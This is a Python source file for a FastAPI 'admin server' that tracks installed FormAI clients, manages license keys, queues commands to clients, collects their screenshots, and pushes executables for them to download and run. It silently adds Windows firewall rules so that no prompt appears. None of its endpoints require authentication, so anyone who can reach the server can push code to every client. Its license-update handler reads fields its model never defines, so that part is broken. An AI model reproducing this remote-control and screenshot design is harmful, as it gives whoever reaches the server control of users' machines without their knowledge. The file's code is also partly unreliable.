#!/usr/bin/env python3
"""
FormAI Admin Server - Monitors active installations
Run this on your admin/monitoring machine
"""
import os
import sys
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List
import uuid

from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
from colorama import init, Fore, Style

# Initialize colorama
init()


def setup_firewall_rules():
    """Add firewall rules silently on Windows to prevent firewall prompt."""
    if sys.platform != "win32":
        return

    import subprocess

    # Check if already set up
    marker_dir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'FormAI')
    os.makedirs(marker_dir, exist_ok=True)
    marker_file = os.path.join(marker_dir, '.admin_firewall_ok')

    if os.path.exists(marker_file):
        return

    try:
        # Delete existing rules first, then add new ones
        subprocess.run(
            ['netsh', 'advfirewall', 'firewall', 'delete', 'rule', 'name=FormAI Admin Server'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
             'name=FormAI Admin Server', 'dir=in', 'action=allow',
             'protocol=TCP', 'localport=5512', 'enable=yes', 'profile=any'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
             'name=FormAI Admin Client', 'dir=out', 'action=allow',
             'protocol=TCP', 'localport=5512', 'enable=yes', 'profile=any'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        # Mark as done
        with open(marker_file, 'w') as f:
            f.write('ok')
    except Exception:
        pass  # Silently fail


# Setup firewall on startup
setup_firewall_rules()

# Admin server configuration
ADMIN_PORT = 5512
DATA_DIR = Path("admin_data")
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
UPDATES_DIR = DATA_DIR / "updates"
CLIENTS_FILE = DATA_DIR / "clients.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
COMMAND_RESULTS_FILE = DATA_DIR / "command_results.json"
LICENSES_FILE = DATA_DIR / "licenses.json"
OFFLINE_THRESHOLD = 600  # 10 minutes

# Ensure data directories exist
DATA_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)
UPDATES_DIR.mkdir(exist_ok=True)

# License storage
licenses: Dict[str, dict] = {}

# Initialize FastAPI
app = FastAPI(title="FormAI Admin Server", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic models
from typing import Optional

class HeartbeatData(BaseModel):
    hostname: str
    local_ip: str
    platform: str = "unknown"
    platform_version: str = "unknown"
    platform_release: str = "unknown"
    machine: str = "unknown"
    processor: str = "unknown"
    python_version: str = "unknown"
    timestamp: str
    version: str = "1.0.0"
    client_id: Optional[str] = None
    license_key: Optional[str] = None
    machine_id: Optional[str] = None


class ClientInfo(BaseModel):
    client_id: str
    hostname: str
    local_ip: str
    platform: str
    platform_version: str
    platform_release: str
    machine: str
    processor: str
    python_version: str
    version: str
    first_seen: str
    last_seen: str
    heartbeat_count: int
    license_key: str = None
    license_status: str = "unknown"
    machine_id: str = None


class LicenseCreate(BaseModel):
    customer_name: str
    customer_email: str = None
    tier: str = "basic"  # basic, pro, enterprise
    max_machines: int = 1
    expires_days: int = 365  # Days until expiration
    notes: str = None


class LicenseUpdate(BaseModel):
    customer_name: str = None
    customer_email: str = None
    tier: str = None
    max_machines: int = None
    expires_at: str = None


class RunProgramRequest(BaseModel):
    version: str
    client_ids: List[str] = None


# In-memory storage (loaded from disk)
clients: Dict[str, dict] = {}
pending_commands: Dict[str, List[dict]] = {}  # client_id -> list of commands
command_results: Dict[str, dict] = {}  # command_id -> result


def load_clients():
    """Load clients from disk"""
    global clients
    if CLIENTS_FILE.exists():
        try:
            with open(CLIENTS_FILE, 'r') as f:
                clients = json.load(f)
            print(f"{Fore.GREEN}[OK] Loaded {len(clients)} clients from disk{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to load clients: {e}{Style.RESET_ALL}")
            clients = {}
    else:
        clients = {}


def save_clients():
    """Save clients to disk"""
    try:
        with open(CLIENTS_FILE, 'w') as f:
            json.dump(clients, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}[X] Failed to save clients: {e}{Style.RESET_ALL}")


def load_commands():
    """Load pending commands from disk"""
    global pending_commands
    if COMMANDS_FILE.exists():
        try:
            with open(COMMANDS_FILE, 'r') as f:
                pending_commands = json.load(f)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to load commands: {e}{Style.RESET_ALL}")
            pending_commands = {}
    else:
        pending_commands = {}


def save_commands():
    """Save pending commands to disk"""
    try:
        with open(COMMANDS_FILE, 'w') as f:
            json.dump(pending_commands, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}[X] Failed to save commands: {e}{Style.RESET_ALL}")


def load_command_results():
    """Load command results from disk"""
    global command_results
    if COMMAND_RESULTS_FILE.exists():
        try:
            with open(COMMAND_RESULTS_FILE, 'r') as f:
                command_results = json.load(f)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to load command results: {e}{Style.RESET_ALL}")
            command_results = {}
    else:
        command_results = {}


def save_command_results():
    """Save command results to disk"""
    try:
        with open(COMMAND_RESULTS_FILE, 'w') as f:
            json.dump(command_results, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}[X] Failed to save command results: {e}{Style.RESET_ALL}")


def load_licenses():
    """Load licenses from disk"""
    global licenses
    if LICENSES_FILE.exists():
        try:
            with open(LICENSES_FILE, 'r') as f:
                licenses = json.load(f)
            print(f"{Fore.GREEN}[OK] Loaded {len(licenses)} licenses from disk{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to load licenses: {e}{Style.RESET_ALL}")
            licenses = {}
    else:
        licenses = {}


def save_licenses():
    """Save licenses to disk"""
    try:
        with open(LICENSES_FILE, 'w') as f:
            json.dump(licenses, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}[X] Failed to save licenses: {e}{Style.RESET_ALL}")


def generate_license_key() -> str:
    """Generate a cryptographically secure license key"""
    import secrets
    import string
    chars = string.ascii_uppercase + string.digits
    # Remove confusing characters (0, O, I, 1)
    chars = chars.replace('0', '').replace('O', '').replace('I', '').replace('1', '')

    def random_segment():
        return ''.join(secrets.choice(chars) for _ in range(4))

    return f"FORMAI-{random_segment()}-{random_segment()}-{random_segment()}-{random_segment()}"


def validate_license(license_key: str, machine_id: str = None) -> dict:
    """
    Validate a license key and optionally bind to machine.

    Returns:
        dict with status, message, and license info
    """
    if not license_key:
        return {"valid": False, "status": "missing", "message": "No license key provided"}

    if license_key not in licenses:
        return {"valid": False, "status": "invalid", "message": "License key not found"}

    license_data = licenses[license_key]

    # Check if license is active
    if not license_data.get("is_active", True):
        return {"valid": False, "status": "revoked", "message": "License has been revoked"}

    # Check expiration
    expires_at = license_data.get("expires_at")
    if expires_at:
        expires_dt = datetime.fromisoformat(expires_at)
        if datetime.utcnow() > expires_dt:
            return {"valid": False, "status": "expired", "message": "License has expired"}

    # Check machine binding
    if machine_id:
        bound_machines = license_data.get("bound_machines", [])
        max_machines = license_data.get("max_machines", 1)

        if machine_id not in bound_machines:
            if len(bound_machines) >= max_machines:
                return {
                    "valid": False,
                    "status": "machine_limit",
                    "message": f"License already used on {max_machines} machine(s)"
                }
            # Bind this machine
            bound_machines.append(machine_id)
            license_data["bound_machines"] = bound_machines
            save_licenses()

    # Update usage stats
    license_data["last_used"] = datetime.utcnow().isoformat()
    license_data["usage_count"] = license_data.get("usage_count", 0) + 1
    save_licenses()

    return {
        "valid": True,
        "status": "valid",
        "message": "License is valid",
        "tier": license_data.get("tier", "basic"),
        "expires_at": license_data.get("expires_at"),
        "customer_name": license_data.get("customer_name")
    }


@app.on_event("startup")
async def startup_event():
    """Load data on startup"""
    load_clients()
    load_commands()
    load_command_results()
    load_licenses()
    print(f"\n{Fore.GREEN}======================================================={Style.RESET_ALL}")
    print(f"{Fore.GREEN}  FormAI Admin Server Started{Style.RESET_ALL}")
    print(f"{Fore.GREEN}======================================================={Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Dashboard: http://localhost:{ADMIN_PORT}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  API Endpoint: http://localhost:{ADMIN_PORT}/api/heartbeat{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Licenses: {len(licenses)} active{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Press Ctrl+C to stop{Style.RESET_ALL}\n")


@app.post("/api/heartbeat")
async def receive_heartbeat(data: HeartbeatData):
    """Receive heartbeat from client with license validation"""
    global clients

    # Generate client_id if not provided
    if not data.client_id:
        data.client_id = str(uuid.uuid4())

    client_id = data.client_id
    now = datetime.utcnow().isoformat()

    # Validate license
    license_result = validate_license(data.license_key, data.machine_id)
    license_status = license_result.get("status", "unknown")

    # Update or create client record
    if client_id in clients:
        clients[client_id]["last_seen"] = now
        clients[client_id]["heartbeat_count"] += 1
        clients[client_id]["hostname"] = data.hostname
        clients[client_id]["local_ip"] = data.local_ip
        clients[client_id]["version"] = data.version
        clients[client_id]["license_key"] = data.license_key
        clients[client_id]["license_status"] = license_status
        clients[client_id]["machine_id"] = data.machine_id
    else:
        clients[client_id] = {
            "client_id": client_id,
            "hostname": data.hostname,
            "local_ip": data.local_ip,
            "platform": data.platform,
            "platform_version": data.platform_version,
            "platform_release": data.platform_release,
            "machine": data.machine,
            "processor": data.processor,
            "python_version": data.python_version,
            "version": data.version,
            "first_seen": now,
            "last_seen": now,
            "heartbeat_count": 1,
            "license_key": data.license_key,
            "license_status": license_status,
            "machine_id": data.machine_id
        }
        license_icon = "[OK]" if license_result["valid"] else "[X]"
        license_color = Fore.GREEN if license_result["valid"] else Fore.RED
        print(f"{Fore.GREEN}[OK] New client: {data.hostname} ({data.local_ip}) {license_color}[License: {license_status}]{Style.RESET_ALL}")

    # Save to disk
    save_clients()

    # Get pending commands for this client
    commands = pending_commands.get(client_id, [])

    # Mark commands as delivered (remove from queue)
    if commands:
        pending_commands[client_id] = []
        save_commands()

    return {
        "status": "ok",
        "client_id": client_id,
        "commands": commands,
        "license": license_result
    }


@app.get("/api/clients")
async def get_clients():
    """Get all clients with online status"""
    now = datetime.utcnow()
    threshold = timedelta(seconds=OFFLINE_THRESHOLD)

    result = []
    for client_id, client in clients.items():
        last_seen = datetime.fromisoformat(client["last_seen"])
        is_online = (now - last_seen) < threshold

        result.append({
            **client,
            "is_online": is_online,
            "minutes_since_seen": int((now - last_seen).total_seconds() / 60)
        })

    # Sort by last_seen (most recent first)
    result.sort(key=lambda x: x["last_seen"], reverse=True)

    return {
        "total": len(result),
        "online": sum(1 for c in result if c["is_online"]),
        "offline": sum(1 for c in result if not c["is_online"]),
        "clients": result
    }


@app.get("/api/stats")
async def get_stats():
    """Get statistics"""
    now = datetime.utcnow()
    threshold = timedelta(seconds=OFFLINE_THRESHOLD)

    online = 0
    offline = 0
    total_heartbeats = 0

    for client in clients.values():
        last_seen = datetime.fromisoformat(client["last_seen"])
        if (now - last_seen) < threshold:
            online += 1
        else:
            offline += 1
        total_heartbeats += client["heartbeat_count"]

    return {
        "total_clients": len(clients),
        "online": online,
        "offline": offline,
        "total_heartbeats": total_heartbeats
    }


@app.post("/api/send_command")
async def send_command(request: dict):
    """Send command to a client"""
    client_id = request.get("client_id")
    command = request.get("command")
    params = request.get("params", {})

    if not client_id or not command:
        raise HTTPException(status_code=400, detail="client_id and command are required")

    if client_id not in clients:
        raise HTTPException(status_code=404, detail="Client not found")

    # Generate command ID
    command_id = str(uuid.uuid4())

    # Create command object
    cmd_obj = {
        "command_id": command_id,
        "command": command,
        "params": params,
        "created_at": datetime.utcnow().isoformat(),
        "status": "pending"
    }

    # Add to pending commands queue
    if client_id not in pending_commands:
        pending_commands[client_id] = []

    pending_commands[client_id].append(cmd_obj)
    save_commands()

    print(f"{Fore.CYAN}[CMD] Command queued for {clients[client_id]['hostname']}: {command}{Style.RESET_ALL}")

    return {
        "status": "ok",
        "command_id": command_id,
        "message": f"Command queued for delivery"
    }


@app.post("/api/command_result")
async def receive_command_result(data: dict):
    """Receive command execution result from client"""
    command_id = data.get("command_id")
    client_id = data.get("client_id")
    result = data.get("result", {})
    timestamp = data.get("timestamp")

    if not command_id or not client_id:
        raise HTTPException(status_code=400, detail="command_id and client_id are required")

    # Handle screenshot results specially
    if result.get("screenshot"):
        try:
            import base64
            screenshot_data = result["screenshot"]
            screenshot_bytes = base64.b64decode(screenshot_data)

            # Save screenshot to disk
            client_name = clients.get(client_id, {}).get("hostname", "unknown")
            timestamp_str = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            screenshot_filename = f"{client_name}_{timestamp_str}.png"
            screenshot_path = SCREENSHOTS_DIR / screenshot_filename

            with open(screenshot_path, 'wb') as f:
                f.write(screenshot_bytes)

            # Store reference to screenshot instead of base64 data
            result["screenshot_file"] = screenshot_filename
            result["screenshot_path"] = str(screenshot_path)
            del result["screenshot"]  # Remove large base64 data

            print(f"{Fore.GREEN}[SCREENSHOT] Saved from {client_name}: {screenshot_filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[X] Failed to save screenshot: {e}{Style.RESET_ALL}")

    # Store result
    command_results[command_id] = {
        "client_id": client_id,
        "result": result,
        "timestamp": timestamp,
        "received_at": datetime.utcnow().isoformat()
    }

    save_command_results()

    status_emoji = "[OK]" if result.get("status") == "success" else "[X]"
    client_name = clients.get(client_id, {}).get("hostname", "unknown")
    print(f"{Fore.GREEN if result.get('status') == 'success' else Fore.RED}{status_emoji} Command result from {client_name}{Style.RESET_ALL}")

    return {"status": "ok"}


@app.get("/api/command_results")
async def get_command_results():
    """Get all command results"""
    return {
        "total": len(command_results),
        "results": command_results
    }


@app.get("/api/command_results/{command_id}")
async def get_command_result(command_id: str):
    """Get specific command result"""
    if command_id not in command_results:
        raise HTTPException(status_code=404, detail="Command result not found")

    return command_results[command_id]


@app.get("/api/screenshots")
async def get_screenshots():
    """Get list of all screenshots"""
    screenshots = []
    if SCREENSHOTS_DIR.exists():
        for screenshot_file in sorted(SCREENSHOTS_DIR.glob("*.png"), key=lambda x: x.stat().st_mtime, reverse=True):
            screenshots.append({
                "filename": screenshot_file.name,
                "size": screenshot_file.stat().st_size,
                "created_at": datetime.fromtimestamp(screenshot_file.stat().st_mtime).isoformat()
            })
    return {
        "total": len(screenshots),
        "screenshots": screenshots
    }


@app.get("/api/screenshots/{filename}")
async def get_screenshot(filename: str):
    """Get a specific screenshot file"""
    screenshot_path = SCREENSHOTS_DIR / filename
    if not screenshot_path.exists():
        raise HTTPException(status_code=404, detail="Screenshot not found")
    return FileResponse(screenshot_path, media_type="image/png")


# Update Management Endpoints

@app.post("/api/updates/upload")
async def upload_update(
    file: UploadFile = File(...),
    version: str = Form(...)
):
    """Upload a new FormAI.exe update"""
    import hashlib

    try:
        # Read file content as bytes (use sync method for reliability)
        file_content = file.file.read()

        print(f"[DEBUG] File type: {type(file_content)}, size: {len(file_content)}")

        # Calculate SHA256 hash
        sha256_hash = hashlib.sha256(file_content).hexdigest()
        file_size = len(file_content)

        # Save update file
        update_filename = f"FormAI_{version}.exe"
        update_path = UPDATES_DIR / update_filename

        with open(update_path, 'wb') as f:
            f.write(file_content)

        # Save metadata
        metadata = {
            "version": version,
            "filename": update_filename,
            "original_filename": file.filename,
            "size": file_size,
            "sha256": sha256_hash,
            "uploaded_at": datetime.now().isoformat()
        }

        metadata_path = UPDATES_DIR / f"FormAI_{version}.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        print(f"{Fore.GREEN}[OK] Uploaded update v{version} ({file_size} bytes, hash: {sha256_hash[:16]}...){Style.RESET_ALL}")

        return {
            "success": True,
            "message": f"Update v{version} uploaded successfully",
            "metadata": metadata
        }

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/updates/list")
async def list_updates():
    """List all available updates"""
    updates = []

    if UPDATES_DIR.exists():
        for metadata_file in sorted(UPDATES_DIR.glob("FormAI_*.json"), key=lambda x: x.stat().st_mtime, reverse=True):
            try:
                with open(metadata_file, 'r') as f:
                    metadata = json.load(f)
                updates.append(metadata)
            except:
                continue

    return {
        "total": len(updates),
        "updates": updates
    }


@app.get("/api/updates/download/{version}")
async def download_update(version: str):
    """Serve update file for download by clients"""
    update_filename = f"FormAI_{version}.exe"
    update_path = UPDATES_DIR / update_filename

    if not update_path.exists():
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    return FileResponse(
        update_path,
        media_type="application/octet-stream",
        filename=update_filename,
        headers={
            "Content-Disposition": f'attachment; filename="{update_filename}"'
        }
    )


@app.post("/api/updates/deploy")
async def deploy_update(version: str, client_ids: List[str] = None):
    """Send update command to selected clients (or all if none specified)"""
    import hashlib

    # Get update metadata
    metadata_path = UPDATES_DIR / f"FormAI_{version}.json"
    if not metadata_path.exists():
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    with open(metadata_path, 'r') as f:
        metadata = json.load(f)

    # Determine target clients
    target_clients = client_ids if client_ids else list(clients.keys())

    if not target_clients:
        raise HTTPException(status_code=400, detail="No clients available")

    # Create update command for each client
    deployed_count = 0
    for client_id in target_clients:
        if client_id not in clients:
            continue

        command = {
            "command_id": str(uuid.uuid4()),
            "command": "update_formai",
            "params": {
                "version": version,
                "sha256": metadata["sha256"],
                "size": metadata["size"]
            },
            "created_at": datetime.now().isoformat(),
            "status": "pending"
        }

        if client_id not in pending_commands:
            pending_commands[client_id] = []

        pending_commands[client_id].append(command)
        deployed_count += 1

    # Save pending commands
    save_commands()

    print(f"{Fore.GREEN}[OK] Deployed update v{version} to {deployed_count} client(s){Style.RESET_ALL}")

    return {
        "success": True,
        "message": f"Update v{version} deployed to {deployed_count} client(s)",
        "version": version,
        "deployed_to": deployed_count,
        "total_clients": len(clients)
    }


@app.post("/api/updates/run")
async def run_program(request: RunProgramRequest):
    """Send run_program command to clients (downloads and runs exe without replacing FormAI)"""
    version = request.version
    client_ids = request.client_ids

    # Get update metadata
    metadata_path = UPDATES_DIR / f"FormAI_{version}.json"
    if not metadata_path.exists():
        raise HTTPException(status_code=404, detail=f"Program v{version} not found")

    with open(metadata_path, 'r') as f:
        metadata = json.load(f)

    # Determine which clients to target
    target_clients = client_ids if client_ids else list(clients.keys())

    # Create run_program command for each client
    deployed_count = 0
    for client_id in target_clients:
        if client_id not in clients:
            continue

        command = {
            "command_id": str(uuid.uuid4()),
            "command": "run_program",
            "params": {
                "version": version,
                "sha256": metadata["sha256"],
                "size": metadata["size"]
            },
            "created_at": datetime.now().isoformat(),
            "status": "pending"
        }

        if client_id not in pending_commands:
            pending_commands[client_id] = []

        pending_commands[client_id].append(command)
        deployed_count += 1

    # Save pending commands
    save_commands()

    print(f"{Fore.GREEN}[OK] Run program v{version} sent to {deployed_count} client(s){Style.RESET_ALL}")

    return {
        "success": True,
        "message": f"Program v{version} sent to {deployed_count} client(s)",
        "version": version,
        "deployed_to": deployed_count,
        "total_clients": len(clients)
    }


@app.delete("/api/updates/{version}")
async def delete_update(version: str):
    """Delete an update and its metadata"""
    update_filename = f"FormAI_{version}.exe"
    metadata_filename = f"FormAI_{version}.json"

    update_path = UPDATES_DIR / update_filename
    metadata_path = UPDATES_DIR / metadata_filename

    deleted = []

    if update_path.exists():
        update_path.unlink()
        deleted.append(update_filename)

    if metadata_path.exists():
        metadata_path.unlink()
        deleted.append(metadata_filename)

    if not deleted:
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    return {
        "success": True,
        "message": f"Deleted update v{version}",
        "deleted_files": deleted
    }


# ============================================
# LICENSE MANAGEMENT ENDPOINTS
# ============================================

@app.post("/api/licenses")
async def create_license(data: LicenseCreate):
    """Create a new license key"""
    license_key = generate_license_key()

    # Calculate expiration date
    expires_at = (datetime.utcnow() + timedelta(days=data.expires_days)).isoformat()

    license_data = {
        "license_key": license_key,
        "customer_name": data.customer_name,
        "customer_email": data.customer_email,
        "tier": data.tier,
        "max_machines": data.max_machines,
        "bound_machines": [],
        "is_active": True,
        "created_at": datetime.utcnow().isoformat(),
        "expires_at": expires_at,
        "usage_count": 0,
        "last_used": None,
        "notes": data.notes
    }

    licenses[license_key] = license_data
    save_licenses()

    print(f"{Fore.GREEN}[OK] New license created for {data.customer_name}: {license_key}{Style.RESET_ALL}")

    return {
        "success": True,
        "license_key": license_key,
        "license": license_data
    }


@app.get("/api/licenses")
async def list_licenses():
    """List all licenses"""
    now = datetime.utcnow()

    result = []
    for key, license_data in licenses.items():
        # Check status
        is_expired = False
        if license_data.get("expires_at"):
            expires_dt = datetime.fromisoformat(license_data["expires_at"])
            is_expired = now > expires_dt

        status = "expired" if is_expired else ("revoked" if not license_data.get("is_active", True) else "active")

        result.append({
            **license_data,
            "status": status,
            "machines_used": len(license_data.get("bound_machines", []))
        })

    # Sort by created_at (newest first)
    result.sort(key=lambda x: x.get("created_at", ""), reverse=True)

    return {
        "total": len(result),
        "active": sum(1 for l in result if l["status"] == "active"),
        "expired": sum(1 for l in result if l["status"] == "expired"),
        "revoked": sum(1 for l in result if l["status"] == "revoked"),
        "licenses": result
    }


@app.get("/api/licenses/{license_key}")
async def get_license(license_key: str):
    """Get a specific license"""
    if license_key not in licenses:
        raise HTTPException(status_code=404, detail="License not found")

    license_data = licenses[license_key]
    now = datetime.utcnow()

    is_expired = False
    if license_data.get("expires_at"):
        expires_dt = datetime.fromisoformat(license_data["expires_at"])
        is_expired = now > expires_dt

    status = "expired" if is_expired else ("revoked" if not license_data.get("is_active", True) else "active")

    return {
        **license_data,
        "status": status,
        "machines_used": len(license_data.get("bound_machines", []))
    }


@app.put("/api/licenses/{license_key}")
async def update_license(license_key: str, data: LicenseUpdate):
    """Update a license"""
    if license_key not in licenses:
        raise HTTPException(status_code=404, detail="License not found")

    license_data = licenses[license_key]

    # Update fields if provided
    if data.customer_name is not None:
        license_data["customer_name"] = data.customer_name
    if data.customer_email is not None:
        license_data["customer_email"] = data.customer_email
    if data.tier is not None:
        license_data["tier"] = data.tier
    if data.max_machines is not None:
        license_data["max_machines"] = data.max_machines
    if data.expires_at is not None:
        license_data["expires_at"] = data.expires_at
    if data.is_active is not None:
        license_data["is_active"] = data.is_active
        if not data.is_active:
            print(f"{Fore.YELLOW}[!] License revoked: {license_key}{Style.RESET_ALL}")
    if data.notes is not None:
        license_data["notes"] = data.notes

    license_data["updated_at"] = datetime.utcnow().isoformat()
    save_licenses()

    return {
        "success": True,
        "message": "License updated",
        "license": license_data
    }


@app.delete("/api/licenses/{license_key}")
async def delete_license(license_key: str):
    """Delete a license"""
    if license_key not in licenses:
        raise HTTPException(status_code=404, detail="License not found")

    del licenses[license_key]
    save_licenses()

    print(f"{Fore.RED}[X] License deleted: {license_key}{Style.RESET_ALL}")

    return {
        "success": True,
        "message": "License deleted"
    }


@app.post("/api/licenses/{license_key}/revoke")
async def revoke_license(license_key: str):
    """Revoke a license"""
    if license_key not in licenses:
        raise HTTPException(status_code=404, detail="License not found")

    licenses[license_key]["is_active"] = False
    licenses[license_key]["revoked_at"] = datetime.utcnow().isoformat()
    save_licenses()

    print(f"{Fore.YELLOW}[!] License revoked: {license_key}{Style.RESET_ALL}")

    return {
        "success": True,
        "message": "License revoked"
    }


@app.post("/api/licenses/{license_key}/unbind")
async def unbind_machine(license_key: str, machine_id: str = None):
    """Unbind a machine from a license (or all machines if no ID provided)"""
    if license_key not in licenses:
        raise HTTPException(status_code=404, detail="License not found")

    license_data = licenses[license_key]

    if machine_id:
        # Remove specific machine
        if machine_id in license_data.get("bound_machines", []):
            license_data["bound_machines"].remove(machine_id)
            save_licenses()
            return {"success": True, "message": f"Machine {machine_id} unbound"}
        else:
            raise HTTPException(status_code=404, detail="Machine not bound to this license")
    else:
        # Remove all machines
        count = len(license_data.get("bound_machines", []))
        license_data["bound_machines"] = []
        save_licenses()
        return {"success": True, "message": f"Unbound {count} machine(s)"}


@app.post("/api/licenses/validate")
async def validate_license_endpoint(license_key: str, machine_id: str = None):
    """Validate a license key (public endpoint for clients)"""
    result = validate_license(license_key, machine_id)
    return result


@app.get("/")
async def serve_admin_dashboard():
    """Serve admin dashboard"""
    # Check if admin.html exists
    admin_html = Path("web/admin.html")
    if admin_html.exists():
        return FileResponse(admin_html)
    else:
        return JSONResponse({
            "message": "Admin dashboard UI not found",
            "api_endpoint": "/api/clients",
            "stats_endpoint": "/api/stats",
            "licenses_endpoint": "/api/licenses"
        })


if __name__ == "__main__":
    print(f"\n{Fore.CYAN}========================================================{Style.RESET_ALL}")
    print(f"{Fore.CYAN}         FormAI Admin Monitoring Server            {Style.RESET_ALL}")
    print(f"{Fore.CYAN}========================================================{Style.RESET_ALL}\n")
    print(f"{Fore.GREEN}Admin Dashboard: http://localhost:{ADMIN_PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}API Endpoints: /api/clients, /api/stats, /api/updates{Style.RESET_ALL}\n")

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=ADMIN_PORT,
        log_level="info"
    )
